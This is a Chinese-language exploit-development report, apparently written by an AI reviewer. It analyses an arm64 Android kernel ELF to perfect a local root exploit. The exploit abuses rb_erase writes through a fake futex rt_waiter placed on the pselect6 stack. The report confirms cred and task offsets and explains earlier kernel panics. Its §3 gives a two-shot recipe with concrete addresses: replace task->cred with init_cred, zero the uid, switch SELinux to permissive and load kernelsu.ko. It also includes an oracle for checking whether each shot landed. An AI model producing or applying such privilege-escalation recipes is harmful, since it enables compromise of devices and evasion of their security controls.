# ELF 实证分析 — 全部定论 (2026-08-16)

> 评审 AI 产出。全部结论来自 `ref/kernel_with_symbols.elf`（+ pyelftools/capstone 指令级反汇编）
> 与 `logs_raw/` 原始日志交叉验证。**本文取代 REVIEW_RESULT.md 中与之冲突的段落**（冲突处在 §6 列明）。
> 工具脚本要点：ELF 装载段 → vaddr 读字节；kallsyms 双表定位符号；capstone 反汇编。

---

## 0. 一页结论（全部指令级实证）

| # | 定论 | 证据 |
|---|---|---|
| 1 | **写原语语义**：erase 落地两条 store：(a) `[TREE_PC&~3 + 8] = child`（child=RIGHT 或 LEFT 或 0）；(b) `child≠0` 时 `[child] = TREE_PC` | rb_erase @0xffffffc008a71228 反汇编 0x1278-0x12a8 逐指令 |
| 2 | **颜色位**：`bit0=1` = BLACK = 触发 rebalance 混沌路径；**`bit0=0` = RED = 干净路径**。**TREE_PC 必须是偶数** | 0x8a71360 `sbfx x8,x9,#0,#1` → `and x10,x8,x10` → `cbnz` 进 erase_color |
| 3 | **cred->uid @ +0x4**（euid@+8, suid@+c, fsuid@+10, gid@+14…）；target.h 的 `CRED_UID_OFF 0x14` 是把 gid 误当 uid | `arm64_sys_getuid` @0x163a58: `ldr x8,[task,#0x780]; ldr w8,[x8,#4]`；commit_creds 比较组 +0x14..0x20 恰为 gid..fsgid |
| 4 | **task->cred @0x780, real_cred @0x778**（target.h 现值正确） | commit_creds @0x18514c 头部双加载 + BUG_ON 比对 |
| 5 | **真 &boot_id = RVA 0x2a60bb5**（dmap 0xffffff8002a60bb5）。mt25/28b 写的 0x28a77d0 是 `random_table[4].data` **指针槽**——boot_id"变了"是指针被改向的显示副作用 | ELF 静态数据：random_table[4] procname='boot_id'（字符串实读），.data 字段含链接期常量 0xffffffc00aa60bb5 |
| 6 | **selinux_state @0x2a41b98 正确**（符号表+静态区全零吻合 runtime 置 1） | kallsyms `selinux_state` 符号 |
| 7 | **栈几何已经是对的：shift=0**。rt_waiter 在 fwrq 帧 sp+0x90（非 0x70），waiter 与 core_sys_select 的 in[0] 完全重合（两条 syscall 链深度均 = 0x210） | 帧级反汇编：futex 链 0x90+0x70+0x1a0(−0x90)；pselect 链 0xa0+0x1c0(−0x50)；零初始化块 0x70..0xe0 = futex_q(0x20)+rt_waiter(0x50) |
| 8 | **mt44 的形状本来就是教科书级正确**（pc=cred−4 偶数=RED、RIGHT=LEFT=0 干净零写 → `[cred+4]=0`）。失败 = 触发命中率 或 cred_cand 身份，不是形状/偏移 | §1+§3 推演 + logs_raw |

---

## 1. rb_erase 真实语义（唯一权威版本）

```
rb_erase(node=假waiter, root)  @0xffffffc008a71228
入口: ldp x8,x9,[node,#8]        ; x8=rb_right(TREE_RIGHT), x9=rb_left(TREE_LEFT)
      cbz x9 → 单孩分支(左空)     ; ← 我们一直走这条(TREE_LEFT=0)

左空分支 @0x8a71278:
  x9  = [node]                   ; x9 = pc (TREE_PC)
  x10 = x9 & ~3                  ; parent
  [parent==0 → 根路径: [root]=child; child≠0 时 [child]=pc; 见下]
  x12 = [parent+0x10]            ; parent->rb_left 与 node 比对 → 恒不等(栈地址≠内核数据)
  → 落 [parent+8]:               ; ★ STORE(a): [TREE_PC&~3 + 8] = child
  child = TREE_RIGHT (若≠0):
      [child] = pc               ; ★ STORE(b): [TREE_RIGHT] = TREE_PC
      无 rebalance, 返回          ;   ← child≠0 时永远干净(bit位无关!)
  child == 0:
      rebalance = (pc&1) ? parent : NULL
      pc&1==1(BLACK) → __rb_erase_color 沿内核数据乱走乱写 ← **mt32/33/34 崩溃根源、v23_10 panic 根源**
      pc&1==0(RED)  → 直接返回    ; ★ 干净单条零写: [目标]=0
  根路径(parent==0): [root]=child; child≠0 → [child]=pc(=0) → 即 [TREE_PC]=0
后续: remove_waiter 在每次 erase 后 RB_CLEAR_NODE: [node]=node(栈内,无害)
```

**操作准则（新）**：
- 零写：`TREE_PC = 目标−8`（须偶数）、`TREE_RIGHT=0`、`TREE_LEFT=0` → 单条 `[目标]=0`
- 指针写：`TREE_PC = 目标−8`（偶数）、`TREE_RIGHT = 值`、`TREE_LEFT=0` → `[目标]=值` + 副作用 `[值]=TREE_PC`（值必须是可写内核地址，且能容忍被写成 目标−8）
- **永远不要让 TREE_PC 是奇数**（BLACK=rebalance=混沌）
- `__arm64_sys_select` 包装帧 0x80 ≠ pselect6 的 0xa0——**不要换 syscall**，pselect6 的几何才对

## 2. 三次历史实验的重新解读（统一模型，无矛盾）

| 实验 | TREE_PC | TREE_RIGHT | 实际发生 | 与观测 |
|---|---|---|---|---|
| mt26 round4 | 0x...2a41b90 | 未设=默认值 0xffffff80028a7700 | (a) `[0x2a41b98] = 0xffffff80028a7700` → enforcing 字节=0x00 → Permissive；(b) `[0x28a7700]=pc` | ✓ Permissive；+1..+7 字节 collateral 打进 selinux_state 后段（幸存） |
| mt28b | 0x...28a77c8 | 0x...28a77e0 | (a) `[0x28a77d0]=0x...77e0`（.data 指针改向）；(b) `[0x28a77e0]=pc` | ✓ boot_id 显示 = 16字节@[0x28a77e0] = `c8778a02-...`（第一字=pc）**分毫不差** |
| mt25 | 0x...28a77c8 | 未设=默认 0x...7700? | (a) .data 改向；(b) `[默认值]=pc` | 显示 `00778a02-...` 与模型差一档——**需 mt25 时代的 .so 二进制才能定案**（默认词值未入库） |
| mt32-34 (写 init_cred 必崩) | task+0x778 (奇偶未控) | init_cred | 当时 pc 未保证偶数 → BLACK → erase_color 把旧 cred 当树遍历 → `[0x27cf]` 解引用 → panic | ✓ 崩溃机制完全解释；**不是"指针写不行"** |

## 3. ROOT 完整配方（两发干净写，全部用已验证语义）

```
前置: perf 泄漏子进程 task (mt44 已有);  逐次触发配 PSELECT_RETRY;
      每发之间用 §4 oracle 验证"这发落地没有"

第 1 发 — 换 cred 指针(拿全套 caps + kernel_t 安全标签):
  PSELECT_TREE_PC   = task + 0x778          (偶数 ✓ RED ✓)
  PSELECT_TREE_RIGHT= 0xffffff80027b0ae0    (init_cred dmap, 可写 ✓)
  PSELECT_TREE_LEFT = 0
  PSELECT_PI_PC/PI_RIGHT/PI_LEFT = 0        (pi-erase 走根路径: [task+0x880]=NULL 清悬垂树, 干净)
  → (a) [task+0x780] = init_cred   ★ task->cred 换成 init_cred
  → (b) [init_cred]  = task+0x778  (usage:=低位(暴涨,防释放,无害); uid:=0xffffff80 ← 需第2发修复)

第 2 发 — 修 init_cred.uid:
  PSELECT_TREE_PC   = 0xffffff80027b0adc    (init_cred−4, 偶数 ✓)
  PSELECT_TREE_RIGHT= 0 ; PSELECT_TREE_LEFT = 0 ; PI_* = 0
  → 单条 [init_cred+4] = 0      ★ uid=0

终态: 子进程 cred = init_cred(uid=0, euid..fsgid=0, cap_permitted/effective=FULL,
      user=init_user, security=kernel_t 有效标签)
      → getuid()=0; capable() 全通过; SELinux 走 kernel_t 域
      → insmod kernelsu.ko (如签名强制,先 [0x2a41b98]=任意偶数pc写低字节0 翻 Permissive — mt26 已证)
注意: real_cred(0x778) 未动 → 之后不要再调 setuid 族(commit_creds 有 cred!=real_cred 的 BUG_ON)
      init_cred.usage 被抬高只影响释放(静态对象,永不释放), 无害
```

若不想动 init_cred：九连零写（uid/euid/suid/fsuid/gid/egid/sgid/fsgid @ cred+0x4..0x20，pc=cred+X−8 全偶数全干净）只拿到 uid=0 无 caps，**对 insmod 不够**——推荐两发方案。

## 4. 单发判活 oracle（每发之后跑，区分"没落地"vs"落地但没效果"）

```
PSELECT_TREE_PC=0xffffff8002a60bb0   (真boot_id−5 对齐, 偶数 ✓)
PSELECT_TREE_RIGHT=0 ; LEFT=0 ; PI_*=0
→ [0x2a60bb8]=0 → boot_id 显示 bytes[3..10] 归零: "97ae8300-0000-0000-0000-b06d5f"
boot_id 变了 = 这发触发+overlay+erase 全链路通;没变 = 触发没中(换轮次重试), 与目标无关
```

## 5. 仓库还缺的东西（按阻塞程度）

1. **mt25/mt28 时代的 .so 二进制**——mt25 落值 `00778a02` 的最后一块拼图（当时默认词值）
2. pstore/dmesg 崩溃转储（可选，验证 §2 mt32-34 崩溃机制解释）
3. ~~BTF~~（**不再需要**——§0 表内所有偏移已由反汇编一锤定音）

## 6. 对 REVIEW_RESULT.md 的勘误（本文件为准）

| 原文 | 更正 |
|---|---|
| "mt26 = w1=w2=0 干净零写" | 实为 RIGHT=默认值 0x...7700，enforcing 吃到低字节 0x00 |
| "pc 需摆 |1 置 RED"（P0-A 轮扫里 0x14 优先） | **方向反了**：bit0=0=RED。pc 必须偶数；uid 偏移 +0x4 本就对（0x14 是 gid），mt44 无需改偏移 |
| "mt28b 落值=tree_pc 是矛盾/混沌所致" | 实为 (b) 副作用写进被 (a) 改向的 .data 指针目标，显示假象；值语义模型本身全程成立 |
| "几何 shift 未定标是卡点/负 shift 待扫" | **shift=0 本来就对**（rt_waiter@sp+0x90）；负 shift 扫描作废×2 |
| mt44 "可能只差一行偏移" | 偏移本来就对；真正差的是命中率判别（§4 oracle）与触发稳定性 |
